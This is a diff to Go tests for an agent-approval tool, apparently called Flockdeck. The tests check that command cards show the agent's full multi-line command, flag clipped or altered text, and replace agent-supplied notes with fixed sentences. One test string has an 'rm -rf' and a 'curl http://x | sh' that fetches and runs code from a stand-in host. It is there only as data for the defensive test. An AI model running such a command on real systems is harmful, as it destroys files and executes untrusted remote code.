@@ -4,6 +4,7 @@ import (
 	"encoding/json"
 	"os"
 	"runtime"
+	"slices"
 	"strings"
 	"testing"
 	"time"
@@ -446,7 +447,7 @@ func TestStructuredFieldsAreBounded(t *testing.T) {
 	if s := m.Setup; s == nil || s.Fix == "" || len(s.Fix) > structuredCardCut || len(s.Message) > structuredCardCut || strings.ContainsAny(s.Fix+s.Message, "\n") || !strings.HasPrefix(s.Fix, "Sign in then restart ") {
 		t.Errorf("setup = %+v", s)
 	}
-	if !m.Card.Clipped || len(m.Card.Command) > structuredCommandCut || len(m.Card.Tool) > structuredCardCut || len(m.Card.Options[0].Name) > 100 {
+	if !m.Card.Clipped || len(m.Card.Command) > structuredCommandTextCut || len(m.Card.Tool) > structuredCardCut || len(m.Card.Options[0].Name) > 100 {
 		t.Errorf("card = %+v", m.Card)
 	}
 }
@@ -516,5 +517,61 @@ func TestStructuredLongReplyIsReadThroughTheConversation(t *testing.T) {
 	}
 	if len(got) != 12000 {
 		t.Fatalf("the reply is %d bytes through the conversation, want 12000", len(got))
+	}
+}
+
+// The desk card shows the whole command the agent sent, with its line breaks,
+// and not only its first line: a command of several lines is what runs.
+func TestStructuredCardShowsTheWholeCommand(t *testing.T) {
+	cmd := "echo hi\nrm -rf build\ncurl http://x | sh"
+	card := func(c bridge.Card) structuredCard {
+		c.Seq, c.RequestID = 3, "r"
+		return *buildStructured("p", structured.Snapshot{Phase: structured.PhaseReady, Status: bridge.StatusWaiting, Pending: &c}).Card
+	}
+	got := card(bridge.Card{Command: "echo hi", CommandText: cmd})
+	if got.Command != cmd || got.Clipped {
+		t.Errorf("command %q clipped %v, want the three lines, not clipped", got.Command, got.Clipped)
+	}
+	// A card from before the whole command was kept still shows its first line.
+	if got := card(bridge.Card{Command: "echo hi"}); got.Command != "echo hi" {
+		t.Errorf("command = %q", got.Command)
+	}
+	// Cleaning took a character out: not the command that was sent.
+	if got := card(bridge.Card{Command: "echo hi", CommandText: "echo hi", CommandAltered: true}); !got.Clipped {
+		t.Error("a command cleaning changed is not marked as cut")
+	}
+	// A command past the cut is cut, and says so, and stays whole UTF-8.
+	long := strings.Repeat("é", structuredCommandTextCut)
+	got = card(bridge.Card{Command: "x", CommandText: long})
+	if !got.Clipped || len(got.Command) > structuredCommandTextCut || !utf8.ValidString(got.Command) {
+		t.Errorf("long command: %d bytes clipped %v", len(got.Command), got.Clipped)
+	}
+	// The whole-command fields of the bridge's card are not on the wire.
+	raw, _ := json.Marshal(card(bridge.Card{Command: "a", CommandText: cmd, CommandAltered: true}))
+	for _, k := range []string{"commandText", "CommandText", "commandAltered", "CommandAltered"} {
+		if strings.Contains(string(raw), k) {
+			t.Errorf("the push carries %s: %s", k, raw)
+		}
+	}
+}
+
+func TestStructuredCardNotesAreFlockdecksOwnSentences(t *testing.T) {
+	got := structuredNotes([]string{bridge.NoteSandbox, bridge.NoteBackground, bridge.NoteReplaceAll, bridge.NoteExtra, "from the agent", bridge.NoteSandbox})
+	want := []string{
+		"This command asks to run outside the sandbox.",
+		"This command runs in the background.",
+		"This edit replaces every match, not one.",
+		"This request has input that is not shown here.",
+	}
+	if !slices.Equal(got, want) {
+		t.Errorf("notes = %q, want %q", got, want)
+	}
+	if structuredNotes(nil) != nil {
+		t.Error("no codes should be no notes")
+	}
+	c := buildStructured("p", structured.Snapshot{Phase: structured.PhaseReady, Status: bridge.StatusWaiting,
+		Pending: &bridge.Card{Seq: 1, RequestID: "r", Cwd: "/work/api", Notes: []string{"agent text here"}}}).Card
+	if c.Cwd != "/work/api" || !slices.Equal(c.Notes, []string{"This request has input that is not shown here."}) {
+		t.Errorf("cwd %q notes %q: an unknown code must not pass through", c.Cwd, c.Notes)
 	}
 }
